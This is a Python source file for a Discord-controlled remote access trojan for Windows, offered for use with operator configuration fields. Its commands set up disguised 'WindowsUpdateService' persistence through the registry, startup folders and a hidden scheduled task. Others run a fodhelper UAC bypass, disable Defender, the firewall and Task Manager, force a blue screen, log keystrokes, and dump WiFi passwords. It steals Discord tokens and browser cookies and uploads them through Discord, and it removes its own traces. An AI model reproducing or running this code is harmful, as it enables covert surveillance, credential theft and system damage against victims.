import discord
import os
import subprocess
import psutil
import platform
import json
import asyncio
import ctypes
import time
import datetime
import socket
import requests
import io
import wave
import pyaudio
import cv2
import pyautogui
import threading
import tempfile
import shutil
import sqlite3
import win32api
import win32con
import win32security
from discord.ext import commands
from PIL import Image
import screeninfo
from gtts import gTTS
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
from comtypes import CLSCTX_ALL
from pynput import keyboard, mouse
from pynput.keyboard import Listener as KeyListener
from pynput.mouse import Listener as MouseListener
import mss
import sys
import base64
import zipfile
import browser_cookie3

# =============================================
# CONFIGURATION - EDIT THESE VALUES
# =============================================

# Your Discord bot token
DISCORD_TOKEN = ""

# Your Discord user IDs (to restrict commands to only these users)
ADMIN_USER_IDS = [user_id here, user_id here]  # Replace with actual Discord user IDs

# Channel ID for bot status notifications (optional)
STATUS_CHANNEL_ID = none  # Set to a channel ID if you want status updates

# Security settings
REQUIRE_ADMIN_PRIVILEGES = False  # Set to True if you want to require admin rights for the bot to run

# =============================================
# END CONFIGURATION
# =============================================

# Global variables
input_blocked = True
key_listener = None
mouse_listener = None
screen_streaming = False
webcam_streaming = False
current_directory = os.getcwd()
keylogger_active = False
keylog_buffer = []
keylogger_listener = None
user_manager = {}

# Bot setup
intents = discord.Intents.default()
intents.message_content = True
intents.members = True
bot = commands.Bot(command_prefix='!', intents=intents)

def is_admin():
    def predicate(ctx):
        return ctx.author.id in ADMIN_USER_IDS
    return commands.check(predicate)

def has_admin_privileges():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

# Audio setup for recording
try:
    audio = pyaudio.PyAudio()
except:
    audio = None

# Keylogger functions
def on_key_press(key):
    global keylog_buffer
    try:
        keylog_buffer.append(f"{datetime.datetime.now()}: {key.char}")
    except AttributeError:
        keylog_buffer.append(f"{datetime.datetime.now()}: {key}")
    
    # Limit buffer size
    if len(keylog_buffer) > 1000:
        keylog_buffer = keylog_buffer[-500:]

def start_keylogger():
    global keylogger_listener, keylogger_active
    if not keylogger_active:
        keylogger_listener = KeyListener(on_press=on_key_press)
        keylogger_listener.start()
        keylogger_active = True

def stop_keylogger():
    global keylogger_listener, keylogger_active
    if keylogger_active and keylogger_listener:
        keylogger_listener.stop()
        keylogger_active = False

@bot.event
async def on_ready():
    print(f'{bot.user} has connected to Discord!')
    print(f'System: {platform.system()} {platform.release()}')
    print(f'Admin privileges: {has_admin_privileges()}')
    print(f'Bot will respond to user IDs: {ADMIN_USER_IDS}')
    
    # Send startup message to status channel if configured
    if STATUS_CHANNEL_ID:
        channel = bot.get_channel(STATUS_CHANNEL_ID)
        if channel:
            try:
                # Get system information for startup message
                uname = platform.uname()
                hostname = socket.gethostname()
                local_ip = socket.gethostbyname(hostname)
                
                # Get public IP
                try:
                    public_ip = requests.get('https://api.ipify.org', timeout=5).text
                except:
                    public_ip = "Unable to retrieve"
                
                embed = discord.Embed(
                    title="🟢 Bot Online", 
                    color=0x00ff00,
                    timestamp=datetime.datetime.now()
                )
                embed.add_field(name="System", value=f"{uname.system} {uname.release}", inline=True)
                embed.add_field(name="Hostname", value=hostname, inline=True)
                embed.add_field(name="Local IP", value=local_ip, inline=True)
                embed.add_field(name="Public IP", value=public_ip, inline=True)
                embed.add_field(name="Admin Rights", value="✅ Yes" if has_admin_privileges() else "❌ No", inline=True)
                embed.add_field(name="Users Online", value="0", inline=True)
                embed.set_footer(text=f"Bot started at")
                
                await channel.send(embed=embed)
            except Exception as e:
                print(f"Error sending startup message: {e}")
    
    # Check if token is still the default
    if DISCORD_TOKEN == "YOUR_BOT_TOKEN_HERE":
        print("❌ ERROR: Please set your DISCORD_TOKEN in the configuration section!")
        await asyncio.sleep(5)
        sys.exit(1)
    
    if 123456789012345678 in ADMIN_USER_IDS:
        print("❌ ERROR: Please replace the default user IDs in ADMIN_USER_IDS with your actual user IDs!")
        await asyncio.sleep(5)
        sys.exit(1)

# === USER MANAGEMENT ===
@bot.command(name='add_user')
@is_admin()
async def add_user(ctx, user_id: int):
    """Add a user to the admin list"""
    if user_id in ADMIN_USER_IDS:
        await ctx.send("❌ User is already in the admin list")
        return
    
    ADMIN_USER_IDS.append(user_id)
    try:
        user = await bot.fetch_user(user_id)
        await ctx.send(f"✅ Added {user.name}#{user.discriminator} to admin list")
    except:
        await ctx.send(f"✅ Added user ID {user_id} to admin list")

@bot.command(name='remove_user')
@is_admin()
async def remove_user(ctx, user_id: int):
    """Remove a user from the admin list"""
    if user_id not in ADMIN_USER_IDS:
        await ctx.send("❌ User is not in the admin list")
        return
    
    if len(ADMIN_USER_IDS) <= 1:
        await ctx.send("❌ Cannot remove the last admin user")
        return
    
    ADMIN_USER_IDS.remove(user_id)
    try:
        user = await bot.fetch_user(user_id)
        await ctx.send(f"✅ Removed {user.name}#{user.discriminator} from admin list")
    except:
        await ctx.send(f"✅ Removed user ID {user_id} from admin list")

@bot.command(name='list_users')
@is_admin()
async def list_users(ctx):
    """List all admin users"""
    user_list = []
    for user_id in ADMIN_USER_IDS:
        try:
            user = await bot.fetch_user(user_id)
            user_list.append(f"{user.name}#{user.discriminator} (ID: {user_id})")
        except:
            user_list.append(f"Unknown User (ID: {user_id})")
    
    embed = discord.Embed(title="👥 Admin Users", color=0x0099ff)
    embed.description = "\n".join(user_list) if user_list else "No users found"
    await ctx.send(embed=embed)

# === ADMIN CHECK ===
@bot.command(name='admincheck')
@is_admin()
async def admin_check(ctx):
    """Check if program has admin privileges"""
    if has_admin_privileges():
        await ctx.send("✅ Program is running with administrator privileges")
    else:
        await ctx.send("❌ Program is NOT running with administrator privileges")

# === USER INFO ===
@bot.command(name='userinfo')
@is_admin()
async def user_info(ctx):
    """Display information about authorized users"""
    user_list = []
    for user_id in ADMIN_USER_IDS:
        try:
            user = await bot.fetch_user(user_id)
            user_list.append(f"{user.name}#{user.discriminator} (ID: {user_id})")
        except:
            user_list.append(f"Unknown User (ID: {user_id})")
    
    embed = discord.Embed(title="👥 Authorized Users", color=0x0099ff)
    embed.description = "\n".join(user_list)
    await ctx.send(embed=embed)

# === STARTUP PERSISTENCE (ENHANCED WITH ADMIN PRIVILEGES) ===
@bot.command(name='startup')
@is_admin()
async def add_to_startup(ctx):
    """Add file to startup with administrator privileges"""
    if not has_admin_privileges():
        await ctx.send("❌ Admin rights required for this command")
        return
    
    try:
        await ctx.send("🔄 Setting up startup persistence with admin privileges...")
        
        current_file = os.path.abspath(sys.argv[0])
        startup_name = "WindowsUpdateService.exe"
        
        # Method 1: Regular startup folder (user level)
        startup_path_user = os.path.expanduser('~') + r'\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'
        
        # Method 2: System-wide startup folder (requires admin)
        startup_path_system = r'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp'
        
        # Method 3: Registry run key (most persistent)
        registry_paths = [
            r'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run',  # System-wide
            r'HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run'   # User-specific
        ]
        
        success_methods = []
        
        # Method 1: Copy to user startup folder
        try:
            if os.path.exists(startup_path_user):
                startup_file_user = os.path.join(startup_path_user, startup_name)
                shutil.copy2(current_file, startup_file_user)
                success_methods.append(f"✅ User Startup Folder: `{startup_file_user}`")
        except Exception as e:
            success_methods.append(f"❌ User Startup: {str(e)}")
        
        # Method 2: Copy to system startup folder (requires admin)
        try:
            if os.path.exists(startup_path_system):
                startup_file_system = os.path.join(startup_path_system, startup_name)
                shutil.copy2(current_file, startup_file_system)
                success_methods.append(f"✅ System Startup Folder: `{startup_file_system}`")
        except Exception as e:
            success_methods.append(f"❌ System Startup: {str(e)}")
        
        # Method 3: Registry persistence
        try:
            # System-wide registry (requires admin)
            subprocess.run([
                'reg', 'add', r'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run', 
                '/v', 'WindowsUpdateService', 
                '/t', 'REG_SZ', 
                '/d', f'"{current_file}"',
                '/f'
            ], shell=True, capture_output=True)
            success_methods.append("✅ System Registry (HKLM)")
        except Exception as e:
            success_methods.append(f"❌ System Registry: {str(e)}")
        
        try:
            # User-specific registry
            subprocess.run([
                'reg', 'add', r'HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run', 
                '/v', 'WindowsUpdateService', 
                '/t', 'REG_SZ', 
                '/d', f'"{current_file}"',
                '/f'
            ], shell=True, capture_output=True)
            success_methods.append("✅ User Registry (HKCU)")
        except Exception as e:
            success_methods.append(f"❌ User Registry: {str(e)}")
        
        # Method 4: Create scheduled task for admin execution (most reliable)
        try:
            task_name = "WindowsUpdateService"
            task_xml = f'''
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Description>Windows Update Service</Description>
  </RegistrationInfo>
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
    </LogonTrigger>
    <BootTrigger>
      <Enabled>true</Enabled>
    </BootTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>S-1-5-18</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>false</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>false</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>4</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>"{current_file}"</Command>
    </Exec>
  </Actions>
</Task>
'''
            # Save XML to temp file
            with open('task.xml', 'w') as f:
                f.write(task_xml)
            
            # Create scheduled task
            result = subprocess.run([
                'schtasks', '/create', '/tn', task_name, 
                '/xml', 'task.xml', '/f'
            ], shell=True, capture_output=True, text=True)
            
            if result.returncode == 0:
                success_methods.append("✅ Scheduled Task (Admin privileges)")
            else:
                success_methods.append(f"❌ Scheduled Task: {result.stderr}")
            
            # Clean up
            if os.path.exists('task.xml'):
                os.remove('task.xml')
                
        except Exception as e:
            success_methods.append(f"❌ Scheduled Task: {str(e)}")
        
        # Method 5: Create a batch file that runs as admin
        try:
            batch_content = f'''
@echo off
:: BatchGotAdmin
:-------------------------------------
REM  --> Check for permissions
>nul 2>&1 "%SYSTEMROOT%\\system32\\cacls.exe" "%SYSTEMROOT%\\system32\\config\\system"

REM --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\\getadmin.vbs"
    echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\\getadmin.vbs"

    "%temp%\\getadmin.vbs"
    exit /B

:gotAdmin
    if exist "%temp%\\getadmin.vbs" ( del "%temp%\\getadmin.vbs" )
    pushd "%CD%"
    CD /D "%~dp0"
:--------------------------------------

start "" "{current_file}"
'''
            batch_path = os.path.join(startup_path_user, "WindowsUpdate.bat")
            with open(batch_path, 'w') as f:
                f.write(batch_content)
            
            success_methods.append(f"✅ Admin Batch File: `{batch_path}`")
        except Exception as e:
            success_methods.append(f"❌ Admin Batch: {str(e)}")
        
        # Send results
        embed = discord.Embed(title="🔗 Startup Persistence Setup", color=0x00ff00)
        embed.description = "\n".join(success_methods)
        embed.add_field(
            name="📝 Summary", 
            value=f"Applied {len([m for m in success_methods if '✅' in m])} persistence methods\n"
                  f"File will run with admin privileges on startup", 
            inline=False
        )
        
        await ctx.send(embed=embed)
        
    except Exception as e:
        await ctx.send(f"❌ Error setting up startup persistence: {str(e)}")

# === CHECK STARTUP STATUS ===
@bot.command(name='startup_status')
@is_admin()
async def startup_status(ctx):
    """Check current startup persistence status"""
    try:
        current_file = os.path.abspath(sys.argv[0])
        startup_name = "WindowsUpdateService.exe"
        
        status_messages = []
        
        # Check user startup folder
        startup_path_user = os.path.expanduser('~') + r'\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'
        user_startup_file = os.path.join(startup_path_user, startup_name)
        if os.path.exists(user_startup_file):
            status_messages.append(f"✅ User Startup: `{user_startup_file}`")
        else:
            status_messages.append("❌ User Startup: Not found")
        
        # Check system startup folder
        startup_path_system = r'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp'
        system_startup_file = os.path.join(startup_path_system, startup_name)
        if os.path.exists(system_startup_file):
            status_messages.append(f"✅ System Startup: `{system_startup_file}`")
        else:
            status_messages.append("❌ System Startup: Not found")
        
        # Check registry entries
        try:
            result = subprocess.run([
                'reg', 'query', r'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run', 
                '/v', 'WindowsUpdateService'
            ], shell=True, capture_output=True, text=True)
            if result.returncode == 0:
                status_messages.append("✅ System Registry: Found")
            else:
                status_messages.append("❌ System Registry: Not found")
        except:
            status_messages.append("❌ System Registry: Error checking")
        
        try:
            result = subprocess.run([
                'reg', 'query', r'HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run', 
                '/v', 'WindowsUpdateService'
            ], shell=True, capture_output=True, text=True)
            if result.returncode == 0:
                status_messages.append("✅ User Registry: Found")
            else:
                status_messages.append("❌ User Registry: Not found")
        except:
            status_messages.append("❌ User Registry: Error checking")
        
        # Check scheduled task
        try:
            result = subprocess.run([
                'schtasks', '/query', '/tn', 'WindowsUpdateService'
            ], shell=True, capture_output=True, text=True)
            if result.returncode == 0:
                status_messages.append("✅ Scheduled Task: Found")
            else:
                status_messages.append("❌ Scheduled Task: Not found")
        except:
            status_messages.append("❌ Scheduled Task: Error checking")
        
        embed = discord.Embed(title="🔍 Startup Persistence Status", color=0x0099ff)
        embed.description = "\n".join(status_messages)
        embed.add_field(
            name="Current File", 
            value=f"`{current_file}`", 
            inline=False
        )
        
        await ctx.send(embed=embed)
        
    except Exception as e:
        await ctx.send(f"❌ Error checking startup status: {str(e)}")

# === REMOVE STARTUP PERSISTENCE ===
@bot.command(name='remove_startup')
@is_admin()
async def remove_startup(ctx):
    """Remove all startup persistence methods"""
    try:
        await ctx.send("🔄 Removing startup persistence...")
        
        removal_messages = []
        startup_name = "WindowsUpdateService.exe"
        
        # Remove from user startup
        startup_path_user = os.path.expanduser('~') + r'\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'
        user_startup_file = os.path.join(startup_path_user, startup_name)
        if os.path.exists(user_startup_file):
            try:
                os.remove(user_startup_file)
                removal_messages.append("✅ Removed from user startup")
            except:
                removal_messages.append("❌ Failed to remove from user startup")
        
        # Remove from system startup
        startup_path_system = r'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp'
        system_startup_file = os.path.join(startup_path_system, startup_name)
        if os.path.exists(system_startup_file):
            try:
                os.remove(system_startup_file)
                removal_messages.append("✅ Removed from system startup")
            except:
                removal_messages.append("❌ Failed to remove from system startup")
        
        # Remove registry entries
        try:
            subprocess.run([
                'reg', 'delete', r'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run', 
                '/v', 'WindowsUpdateService', '/f'
            ], shell=True, capture_output=True)
            removal_messages.append("✅ Removed from system registry")
        except:
            removal_messages.append("❌ Failed to remove from system registry")
        
        try:
            subprocess.run([
                'reg', 'delete', r'HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run', 
                '/v', 'WindowsUpdateService', '/f'
            ], shell=True, capture_output=True)
            removal_messages.append("✅ Removed from user registry")
        except:
            removal_messages.append("❌ Failed to remove from user registry")
        
        # Remove scheduled task
        try:
            subprocess.run([
                'schtasks', '/delete', '/tn', 'WindowsUpdateService', '/f'
            ], shell=True, capture_output=True)
            removal_messages.append("✅ Removed scheduled task")
        except:
            removal_messages.append("❌ Failed to remove scheduled task")
        
        # Remove batch file
        batch_file = os.path.join(startup_path_user, "WindowsUpdate.bat")
        if os.path.exists(batch_file):
            try:
                os.remove(batch_file)
                removal_messages.append("✅ Removed batch file")
            except:
                removal_messages.append("❌ Failed to remove batch file")
        
        embed = discord.Embed(title="🗑️ Startup Persistence Removed", color=0xff0000)
        embed.description = "\n".join(removal_messages)
        await ctx.send(embed=embed)
        
    except Exception as e:
        await ctx.send(f"❌ Error removing startup persistence: {str(e)}")

# === BLUESCREEN ===
@bot.command(name='bluescreen')
@is_admin()
async def trigger_bluescreen(ctx):
    """Trigger a blue screen (USE WITH EXTREME CAUTION)"""
    if not has_admin_privileges():
        await ctx.send("❌ Admin rights required for this command")
        return
    
    await ctx.send("🔴 WARNING: This will cause a blue screen and data loss! Use !confirmbluescreen to proceed")
    
@bot.command(name='confirmbluescreen')
@is_admin()
async def confirm_bluescreen(ctx):
    """Confirm blue screen trigger"""
    if not has_admin_privileges():
        await ctx.send("❌ Admin rights required for this command")
        return
    
    try:
        # This is extremely dangerous - causes immediate system crash
        ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
        ctypes.windll.ntdll.NtRaiseHardError(0xC000021A, 0, 0, 0, 6, ctypes.byref(ctypes.c_uint()))
        await ctx.send("💀 Blue screen triggered!")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

# === DISABLE ANTIVIRUS/FIREWALL ===
@bot.command(name='disableantivirus')
@is_admin()
async def disable_antivirus(ctx):
    """Disable Windows Defender"""
    if not has_admin_privileges():
        await ctx.send("❌ Admin rights required for this command")
        return
    
    try:
        # Disable Windows Defender real-time protection
        subprocess.run(['powershell', 'Set-MpPreference -DisableRealtimeMonitoring $true'], shell=True)
        subprocess.run(['powershell', 'Set-MpPreference -DisableBehaviorMonitoring $true'], shell=True)
        subprocess.run(['powershell', 'Set-MpPreference -DisableBlockAtFirstSeen $true'], shell=True)
        
        # Stop Defender service
        subprocess.run('net stop WinDefend', shell=True)
        subprocess.run('sc config WinDefend start= disabled', shell=True)
        
        await ctx.send("🛡️ Windows Defender disabled")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command(name='disablefirewall')
@is_admin()
async def disable_firewall(ctx):
    """Disable Windows Firewall"""
    if not has_admin_privileges():
        await ctx.send("❌ Admin rights required for this command")
        return
    
    try:
        subprocess.run('netsh advfirewall set allprofiles state off', shell=True)
        await ctx.send("🔥 Windows Firewall disabled")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

# === TASK MANAGER CONTROL ===
@bot.command(name='distaskmgr')
@is_admin()
async def disable_task_manager(ctx):
    """Disable Task Manager"""
    if not has_admin_privileges():
        await ctx.send("❌ Admin rights required for this command")
        return
    
    try:
        subprocess.run(['reg', 'add', 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System', '/v', 'DisableTaskMgr', '/t', 'REG_DWORD', '/d', '1', '/f'])
        await ctx.send("❌ Task Manager disabled")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command(name='enbtaskmgr')
@is_admin()
async def enable_task_manager(ctx):
    """Enable Task Manager"""
    if not has_admin_privileges():
        await ctx.send("❌ Admin rights required for this command")
        return
    
    try:
        subprocess.run(['reg', 'add', 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System', '/v', 'DisableTaskMgr', '/t', 'REG_DWORD', '/d', '0', '/f'])
        await ctx.send("✅ Task Manager enabled")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

# === CD DRIVE CONTROL ===
@bot.command(name='ejectcd')
@is_admin()
async def eject_cd(ctx):
    """Eject CD drive"""
    try:
        ctypes.windll.winmm.mciSendStringW("set cdaudio door open", None, 0, None)
        await ctx.send("📀 CD drive ejected")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command(name='retractcd')
@is_admin()
async def retract_cd(ctx):
    """Retract CD drive"""
    try:
        ctypes.windll.winmm.mciSendStringW("set cdaudio door closed", None, 0, None)
        await ctx.send("📀 CD drive retracted")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

# === DISCORD INFO GRABBER (ENHANCED) ===
@bot.command(name='getdiscordinfo')
@is_admin()
async def get_discord_info(ctx):
    """Get Discord tokens, info, and data"""
    try:
        await ctx.send("🔍 Gathering Discord information... This may take a moment.")
        
        discord_data = {}
        tokens_found = []
        
        # Common Discord paths
        discord_paths = {
            'Discord': os.path.expanduser('~') + r'\AppData\Roaming\discord',
            'Discord Canary': os.path.expanduser('~') + r'\AppData\Roaming\DiscordCanary',
            'Discord PTB': os.path.expanduser('~') + r'\AppData\Roaming\DiscordPTB',
        }
        
        for client_name, base_path in discord_paths.items():
            if os.path.exists(base_path):
                client_data = {}
                
                # Local Storage (tokens)
                local_storage_path = os.path.join(base_path, 'Local Storage', 'leveldb')
                if os.path.exists(local_storage_path):
                    tokens = []
                    for file in os.listdir(local_storage_path):
                        if file.endswith('.ldb') or file.endswith('.log'):
                            try:
                                with open(os.path.join(local_storage_path, file), 'r', errors='ignore') as f:
                                    content = f.read()
                                    # Look for tokens
                                    if 'token' in content.lower():
                                        # Extract potential tokens
                                        lines = content.split('\n')
                                        for line in lines:
                                            if 'token' in line.lower():
                                                tokens.append(f"Found in {file}: {line.strip()[:100]}...")
                            except:
                                pass
                    
                    if tokens:
                        client_data['tokens'] = tokens
                        tokens_found.extend(tokens)
                
                # Settings
                settings_path = os.path.join(base_path, 'settings.json')
                if os.path.exists(settings_path):
                    try:
                        with open(settings_path, 'r') as f:
                            settings = json.load(f)
                            client_data['settings'] = settings
                    except:
                        client_data['settings'] = "Error reading settings"
                
                # Cookies
                cookies_path = os.path.join(base_path, 'Cookies')
                if os.path.exists(cookies_path):
                    client_data['cookies'] = f"Cookies database found ({os.path.getsize(cookies_path)} bytes)"
                
                if client_data:
                    discord_data[client_name] = client_data
        
        # Get browser cookies for Discord
        try:
            browser_cookies = {}
            for browser_name in ['chrome', 'firefox', 'edge']:
                try:
                    if browser_name == 'chrome':
                        cj = browser_cookie3.chrome(domain_name='discord.com')
                    elif browser_name == 'firefox':
                        cj = browser_cookie3.firefox(domain_name='discord.com')
                    elif browser_name == 'edge':
                        cj = browser_cookie3.edge(domain_name='discord.com')
                    
                    cookies = []
                    for cookie in cj:
                        cookies.append(f"{cookie.name}: {cookie.value[:50]}...")
                    
                    if cookies:
                        browser_cookies[browser_name] = cookies
                except:
                    pass
            
            if browser_cookies:
                discord_data['Browser Cookies'] = browser_cookies
        except:
            pass
        
        # Create a zip file with the collected data
        zip_filename = f"discord_info_{int(time.time())}.zip"
        with zipfile.ZipFile(zip_filename, 'w') as zipf:
            # Add token information
            if tokens_found:
                token_content = "\n".join(tokens_found)
                zipf.writestr("tokens.txt", token_content)
            
            # Add settings and other data
            for client_name, data in discord_data.items():
                client_content = f"=== {client_name} ===\n\n"
                for key, value in data.items():
                    client_content += f"--- {key} ---\n"
                    if isinstance(value, list):
                        client_content += "\n".join(value) + "\n"
                    elif isinstance(value, dict):
                        client_content += json.dumps(value, indent=2) + "\n"
                    else:
                        client_content += str(value) + "\n"
                    client_content += "\n"
                
                zipf.writestr(f"{client_name}.txt", client_content)
        
        # Send the results
        if discord_data:
            embed = discord.Embed(title="🔍 Discord Information Found", color=0x7289da)
            for client_name, data in discord_data.items():
                value = f"Tokens: {len(data.get('tokens', []))}\n"
                value += f"Settings: {'Yes' if 'settings' in data else 'No'}\n"
                value += f"Cookies: {'Yes' if 'cookies' in data else 'No'}"
                embed.add_field(name=client_name, value=value, inline=True)
            
            await ctx.send(embed=embed)
            await ctx.send(file=discord.File(zip_filename))
            os.remove(zip_filename)
        else:
            await ctx.send("❌ No Discord information found")
            
    except Exception as e:
        await ctx.send(f"❌ Error gathering Discord info: {str(e)}")

# === WIFI PASSWORDS ===
@bot.command(name='getwifipass')
@is_admin()
async def get_wifi_passwords(ctx):
    """Get all WiFi passwords"""
    if not has_admin_privileges():
        await ctx.send("❌ Admin rights required for this command")
        return
    
    try:
        result = subprocess.run(['netsh', 'wlan', 'show', 'profiles'], capture_output=True, text=True)
        profiles = [line.split(":")[1].strip() for line in result.stdout.split('\n') if "All User Profile" in line]
        
        passwords = []
        for profile in profiles[:15]:  # Limit to first 15
            try:
                result = subprocess.run(['netsh', 'wlan', 'show', 'profile', profile, 'key=clear'], capture_output=True, text=True)
                lines = result.stdout.split('\n')
                password_line = [line.split(":")[1].strip() for line in lines if "Key Content" in line]
                password = password_line[0] if password_line else "No password"
                passwords.append(f"**{profile}**: `{password}`")
            except:
                passwords.append(f"**{profile}**: Error retrieving")
        
        if passwords:
            # Split into chunks if too long
            chunk_size = 10
            for i in range(0, len(passwords), chunk_size):
                chunk = passwords[i:i + chunk_size]
                embed = discord.Embed(title="📶 WiFi Passwords", color=0x0099ff)
                embed.description = "\n".join(chunk)
                await ctx.send(embed=embed)
        else:
            await ctx.send("❌ No WiFi profiles found")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

# === KEYLOGGER COMMANDS ===
@bot.command(name='startkeylogger')
@is_admin()
async def start_keylogger_cmd(ctx):
    """Start keylogger"""
    try:
        start_keylogger()
        await ctx.send("⌨️ Keylogger started")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command(name='stopkeylogger')
@is_admin()
async def stop_keylogger_cmd(ctx):
    """Stop keylogger"""
    try:
        stop_keylogger()
        await ctx.send("🛑 Keylogger stopped")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command(name='dumpkeylogger')
@is_admin()
async def dump_keylogger(ctx):
    """Dump keylog data"""
    global keylog_buffer
    try:
        if keylog_buffer:
            log_text = "\n".join(keylog_buffer[-100:])  # Last 100 entries
            if len(log_text) > 1900:
                log_text = log_text[:1900] + "..."
            
            with open("keylog.txt", "w") as f:
                f.write("\n".join(keylog_buffer))
            
            await ctx.send(f"📄 Last 100 keystrokes:\n```{log_text}```")
            await ctx.send(file=discord.File("keylog.txt"))
            os.remove("keylog.txt")
        else:
            await ctx.send("❌ No keylog data available")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

# === UAC BYPASS ===
@bot.command(name='uacbypass')
@is_admin()
async def uac_bypass(ctx):
    """Attempt UAC bypass using fodhelper"""
    try:
        # Alternative method using registry
        subprocess.run(['reg', 'add', 'HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command', '/d', 'cmd.exe', '/f'])
        subprocess.run(['reg', 'add', 'HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command', '/v', 'DelegateExecute', '/f'])
        subprocess.run('fodhelper.exe')
        
        await ctx.send("🔄 UAC bypass attempted")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

# === WINDOWS PASSWORD DUMP ===
@bot.command(name='windowspass')
@is_admin()
async def windows_password_dump(ctx):
    """Attempt to dump Windows passwords"""
    if not has_admin_privileges():
        await ctx.send("❌ Admin rights required for this command")
        return
    
    try:
        # This would require mimikatz or similar tools
        await ctx.send("🔐 Password dump would require external tools like mimikatz")
        await ctx.send("⚠️ This feature is not implemented for security reasons")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

# === SELF DESTRUCT ===
@bot.command(name='selfdestruct')
@is_admin()
async def self_destruct(ctx):
    """Remove all traces of the program"""
    try:
        # Clean up traces
        if os.path.exists("keylog.txt"):
            os.remove("keylog.txt")
        
        # Remove from startup if installed
        startup_path = os.path.expanduser('~') + r'\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'
        for file in os.listdir(startup_path):
            if "discord_bot" in file.lower() or "remote_admin" in file.lower():
                try:
                    os.remove(os.path.join(startup_path, file))
                except:
                    pass
        
        # Clear temp files
        temp_files = [f for f in os.listdir('.') if f.startswith('temp_') or f.startswith('screenshot') or f.startswith('webcam')]
        for file in temp_files:
            try:
                os.remove(file)
            except:
                pass
        
        await ctx.send("💥 Self-destruct sequence initiated. Removing traces...")
        
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

# === DISPLAY CONTROL ===
@bot.command(name='displayoff')
@is_admin()
async def display_off(ctx):
    """Turn off monitor"""
    try:
        ctypes.windll.user32.SendMessageW(0xFFFF, 0x0112, 0xF170, 2)
        await ctx.send("🖥️ Display turned off")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command(name='displayon')
@is_admin()
async def display_on(ctx):
    """Turn on monitor"""
    try:
        ctypes.windll.user32.SendMessageW(0xFFFF, 0x0112, 0xF170, -1)
        await ctx.send("🖥️ Display turned on")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

# === WALLPAPER CHANGE ===
@bot.command(name='wallpaper')
@is_admin()
async def change_wallpaper(ctx):
    """Change wallpaper"""
    if not ctx.message.attachments:
        await ctx.send("❌ Please attach an image file")
        return
    
    attachment = ctx.message.attachments[0]
    valid_extensions = ['.jpg', '.jpeg', '.png', '.bmp']
    
    if not any(attachment.filename.lower().endswith(ext) for ext in valid_extensions):
        await ctx.send("❌ Only image files are supported")
        return
    
    try:
        await attachment.save('wallpaper_temp.jpg')
        ctypes.windll.user32.SystemParametersInfoW(20, 0, os.path.abspath('wallpaper_temp.jpg'), 3)
        await ctx.send("🖼️ Wallpaper changed successfully")
        os.remove('wallpaper_temp.jpg')
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

